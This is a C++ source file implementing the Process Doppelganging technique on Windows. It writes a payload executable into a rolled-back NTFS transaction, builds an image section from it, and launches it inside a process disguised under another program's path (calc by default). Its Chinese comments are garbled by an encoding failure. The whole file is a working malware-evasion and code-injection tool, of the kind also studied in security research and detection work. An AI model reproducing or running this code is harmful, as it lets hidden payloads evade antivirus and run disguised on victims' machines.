#include <Windows.h>
#include <KtmW32.h>

#include <iostream>
#include <stdio.h>

#include "ntddk.h"
#include "ntdll_undoc.h"
#include "util.h"

#include "pe_hdrs_helper.h"
#include "process_env.h"

#pragma comment(lib, "KtmW32.lib")
#pragma comment(lib, "Ntdll.lib")

using namespace std;

#define PAGE_SIZE 0x1000

HANDLE make_transacted_section(BYTE* payloadBuf, DWORD payloadSize)
{
    DWORD options, isolationLvl, isolationFlags, timeout;
    options = isolationLvl = isolationFlags = timeout = 0;
    
    // CreateTransaction ��������
    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, nullptr);
    if (hTransaction == INVALID_HANDLE_VALUE) {
        cerr << "Failed to create transaction!" << endl;
        return INVALID_HANDLE_VALUE;
    }
    wchar_t dummy_name[MAX_PATH] = { 0 };
    wchar_t temp_path[MAX_PATH] = { 0 };

    // ��ȡһ����ʱ�ļ�
    DWORD size = GetTempPathW(MAX_PATH, temp_path);
    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);

    // ���������ļ���д��������
    HANDLE hTransactedWriter = CreateFileTransactedW(dummy_name,
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );
    if (hTransactedWriter == INVALID_HANDLE_VALUE) {
        cerr << "Failed to create transacted file: " << GetLastError() << endl;
        return INVALID_HANDLE_VALUE;
    }

    // ������PEд�뵽��ʱ�ļ����ڴ��У�
    DWORD writtenLen = 0;
    if (!WriteFile(hTransactedWriter, payloadBuf, payloadSize, &writtenLen, NULL)) {
        cerr << "Failed writing payload! Error: " << GetLastError() << endl;
        return INVALID_HANDLE_VALUE;
    }
    
    CloseHandle(hTransactedWriter);
    hTransactedWriter = nullptr;

    // ���������ļ��Ķ���������
    HANDLE hTransactedReader = CreateFileTransactedW(dummy_name,
        GENERIC_READ,
        FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );
    if (hTransactedReader == INVALID_HANDLE_VALUE) {
        cerr << "Failed to open transacted file: " << GetLastError() << endl;
        return INVALID_HANDLE_VALUE;
    }

    // NtCreateSection ����section
    HANDLE hSection = nullptr;
    NTSTATUS status = NtCreateSection(&hSection,
        SECTION_MAP_EXECUTE,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hTransactedReader
    );
    if (status != STATUS_SUCCESS) {
        cerr << "NtCreateSection failed: " << hex << status << endl;
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransactedReader);
    hTransactedReader = nullptr;

    // ͨ��RollbackTransaction�ع�
    if (RollbackTransaction(hTransaction) == FALSE) {
        cerr << "RollbackTransaction failed: " << hex << GetLastError() << endl;
        return INVALID_HANDLE_VALUE;
    }
    CloseHandle(hTransaction);
    hTransaction = nullptr;

    return hSection;
}


bool process_doppel(wchar_t* targetPath, BYTE* payloadBuf, DWORD payloadSize)
{
    // make_transacted_section �������񣬷��ض���Section
    HANDLE hSection = make_transacted_section(payloadBuf, payloadSize);

    if (!hSection || hSection == INVALID_HANDLE_VALUE) {
        return false;
    }

    // ��������
    HANDLE hProcess = nullptr;
    NTSTATUS status = NtCreateProcessEx(
        &hProcess, //ProcessHandle
        PROCESS_ALL_ACCESS, //DesiredAccess
        NULL, //ObjectAttributes
        NtCurrentProcess(), //ParentProcess
        PS_INHERIT_HANDLES, //Flags
        hSection, //sectionHandle
        NULL, //DebugPort
        NULL, //ExceptionPort
        FALSE //InJob
    );
    if (status != STATUS_SUCCESS) {
        cerr << "NtCreateProcessEx failed! Status: " << hex << status << endl;
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
            cerr << "[!] The payload has mismatching bitness!" << endl;
        }
        return false;
    }

    PROCESS_BASIC_INFORMATION pi = { 0 };

    DWORD ReturnLength = 0;
    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &ReturnLength
    );
    if (status != STATUS_SUCCESS) {
        cerr << "NtQueryInformationProcess failed: " << hex << status << endl;
        return false;
    }

    PEB peb_copy = { 0 };
    if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
        return false;
    }
    ULONGLONG imageBase = (ULONGLONG)peb_copy.ImageBaseAddress;
#ifdef _DEBUG
    cout << "ImageBase address: " << (hex) << (ULONGLONG)imageBase << endl;
#endif
    // ��ȡ AddressOfEntryPoint
    DWORD payload_ep = get_entry_point_rva(payloadBuf);
    ULONGLONG procEntry = payload_ep + imageBase;

    // ׼��������Ŀ�����(�����)
    if (!setup_process_parameters(hProcess, pi, targetPath)) {
        cerr << "Parameters setup failed" << endl;
        return false;
    }
    cout << "[+] Process created! Pid = " << dec << GetProcessId(hProcess) << "\n";
#ifdef _DEBUG
    cerr << "EntryPoint at: " << (hex) << (ULONGLONG)procEntry << endl;
#endif
    // �����߳�ָ��EP
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE)procEntry,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (status != STATUS_SUCCESS) {
        cerr << "NtCreateThreadEx failed: " << hex << status << endl;
        return false;
    }

    return true;
}

int wmain(int argc, wchar_t* argv[])
{
#ifdef _WIN64
    const bool is32bit = false;
#else
    const bool is32bit = true;
#endif
    if (argc < 2) {
        cout << "Process Doppelganging (";
        if (is32bit) cout << "32bit";
        else cout << "64bit";
        cout << ")\n";
        cout << "params: <payload path> [*target path]\n" << endl;
        cout << "* - optional" << endl;
        system("pause");
        return 0;
    }

    // ��ʼ�� NtCreateProcessEx��RtlCreateProcessParametersEx��NtCreateThreadEx ����
    if (init_ntdll_func() == false) {
        return -1;
    }
    wchar_t defaultTarget[MAX_PATH] = { 0 };

    // Ĭ��ע��calc
    get_calc_path(defaultTarget, MAX_PATH, is32bit);
    wchar_t* targetPath = defaultTarget;
    if (argc >= 3) {
        targetPath = argv[2];
    }
    wchar_t* payloadPath = argv[1];
    size_t payloadSize = 0;
    
    // ͨ��CreateFileMapping+MapViewOfFile������PEչ�����ڴ���
    BYTE* payloadBuf = buffer_payload(payloadPath, payloadSize);
    if (payloadBuf == NULL) {
        cerr << "Cannot read payload!" << endl;
        return -1;
    }

    // Process Doppelganging ������
    bool is_ok = process_doppel(targetPath, payloadBuf, (DWORD)payloadSize);

    free_buffer(payloadBuf, payloadSize);
    if (is_ok) {
        cerr << "[+] Done!" << endl;
    }
    else {
        cerr << "[-] Failed!" << endl;
#ifdef _DEBUG
        system("pause");
#endif
        return -1;
    }
#ifdef _DEBUG
    system("pause");
#endif
    return 0;
}
